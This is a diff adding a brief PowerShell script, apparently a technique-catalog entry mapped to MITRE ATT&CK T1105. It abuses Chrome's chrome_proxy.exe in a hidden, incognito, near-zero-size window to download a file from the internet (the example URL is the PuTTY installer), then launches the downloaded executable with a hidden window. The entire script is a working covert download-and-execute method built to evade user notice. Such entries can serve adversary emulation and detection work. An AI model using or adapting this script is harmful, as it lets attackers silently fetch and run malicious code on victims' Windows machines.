@@ -1,0 +1,22 @@
+#Usecase: Download file from the internet
+#Privileges required: User
+#OS: Windows 10, Windows 11
+#MITRE ATT&CK®: T1105: Ingress Tool Transfer
+#Chrome will launch in Incognito mode and download the file. 
+
+#Command:
+#& 'C:\Program Files\Google\Chrome\Application\chrome_proxy.exe'  --profile-directory=Default --incognito --chrome-frame --user-data-dir= C:\Temp\Temp-chrome\ --window-size=0,0 --window-position="0000,1000" <URL>
+
+
+$chromePath = "C:\Program Files\Google\Chrome\Application\chrome_proxy.exe"
+$chromeArgs = "--profile-directory=Default", "--incognito", "--chrome-frame", "--user-data-dir= C:\Temp\tmp-chrome" , "--window-size=7,7", "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+$exePath = "C:/Users/$($env:USERNAME)/Downloads/<file name>"
+
+# Start Chrome with the downloaded file
+Start-Process -FilePath $chromePath -ArgumentList $chromeArgs -WindowStyle Hidden
+
+# Wait for Chrome to launch
+Start-Sleep -Seconds 20
+
+# Start the downloaded file
+Start-Process -FilePath $exePath -WindowStyle Hidden
